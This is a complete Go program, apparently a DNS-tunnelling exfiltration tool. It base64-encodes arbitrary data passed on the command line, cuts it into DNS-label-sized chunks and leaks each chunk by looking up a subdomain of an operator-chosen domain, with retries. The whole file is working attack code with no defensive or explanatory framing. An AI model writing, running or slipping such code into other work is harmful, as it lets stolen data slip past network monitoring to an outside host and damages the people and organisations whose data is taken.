package main

import (
    "encoding/base64"
    "fmt"
    "net"
    "os"
    "time"
)

func main() {
    if len(os.Args) != 3 {
        fmt.Printf("Usage: %s <DOMAIN> <DATA>\n", os.Args[0])
        os.Exit(1)
    }

    domain := os.Args[1]
    data := os.Args[2]

    err := exfiltrate(domain, data)
    if err != nil {
        fmt.Println("Error during exfiltration:", err)
    } else {
        fmt.Println("Data exfiltrated successfully.")
    }
}

func exfiltrate(domain, data string) error {
    maxLabelLength := 63
    encodedData := encodeData(data)
    chunks := chunkString(encodedData, maxLabelLength)

    for _, chunk := range chunks {
        query := fmt.Sprintf("%s.%s", chunk, domain)
        err := dnsQueryWithRetry(query, 3, time.Second)
        if err != nil {
            return err
        }
    }

    return nil
}

func encodeData(data string) string {
    return base64.URLEncoding.EncodeToString([]byte(data))
}

func chunkString(s string, chunkSize int) []string {
    var chunks []string
    for i := 0; i < len(s); i += chunkSize {
        end := i + chunkSize
        if end > len(s) {
            end = len(s)
        }
        chunks = append(chunks, s[i:end])
    }
    return chunks
}

func dnsQueryWithRetry(query string, maxRetries int, delay time.Duration) error {
    var err error
    for i := 0; i < maxRetries; i++ {
        _, err = net.LookupHost(query)
        if err == nil {
            return nil
        }
        time.Sleep(delay)
    }
    return fmt.Errorf("DNS query failed after %d attempts: %v", maxRetries, err)
}
